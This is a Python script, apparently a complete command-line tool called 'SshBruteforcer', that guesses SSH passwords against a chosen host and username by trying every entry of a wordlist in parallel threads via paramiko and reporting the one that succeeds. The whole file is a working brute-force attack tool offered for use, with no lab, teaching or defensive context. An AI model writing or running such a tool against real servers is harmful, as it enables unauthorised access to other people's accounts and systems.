import os
import sys
import time
import threading
import pyfiglet
import paramiko
from colorama import Fore


GREEN = Fore.GREEN
RED = Fore.RED
exit_code = 0


def banner():
    ascii_banner = pyfiglet.figlet_format("SshBruteforcer", font="small")
    print(ascii_banner)


def init():
    wordlist_path = sys.argv[4]
    with open(wordlist_path, errors="ignore") as f:
        wordlist = f.read().splitlines()
    main(wordlist)


def ssh_connect(hostname, port, uname, word, code=False):
    global exit_code
    if exit_code == 1:
        exit(1)

    ssh_connection = paramiko.SSHClient()
    ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh_connection.connect(hostname=hostname, port=port, username=uname, password=word)
    except paramiko.AuthenticationException:
        code = True
    except KeyboardInterrupt:
        print("Exitting..")
    finally:
        ssh_connection.close()

    if not code:
        print(f"{GREEN} Password Found!: " + word)
        exit_code = 1
    else:
        print(f"{RED}Trying:", word, "                     ")


def main(wlst):
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    uname = sys.argv[3]
    print("Target:", hostname, ":", port, "\nUsername:", uname, "\n")

    threads = []
    for i in range(0, len(wlst), 10):
        words = wlst[i:i + 10]
        for w in words:
            thread = threading.Thread(target=ssh_connect, args=(hostname, port, uname, w))
            threads.append(thread)


    for thread in threads:
        time.sleep(.75)    # fast attempts cause errors
        thread.start()

    for thread in threads:
        thread.join()


if __name__ == '__main__':
    banner()
    if len(sys.argv) < 5:
        print("Usage: %s <hostname> <port> <username> <passwordlist>" % sys.argv[0])
        sys.exit(1)
    init()
